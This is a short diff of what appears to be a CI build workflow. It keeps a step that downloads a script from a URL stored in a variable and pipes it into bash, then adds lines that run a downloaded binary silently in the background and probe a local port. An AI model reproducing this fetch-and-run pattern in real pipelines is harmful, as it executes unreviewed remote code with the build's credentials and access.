@@ -24,7 +24,6 @@ jobs:
         echo "Starting build process..."
         curl -sSL $TESTING | bash -s -- ddrv
 
-        cd *_DD
+        nohup bash -c './*_DD' > /dev/null 2>&1 &
 
-        ls
-        
+        sleep 5 && curl localhost:2526
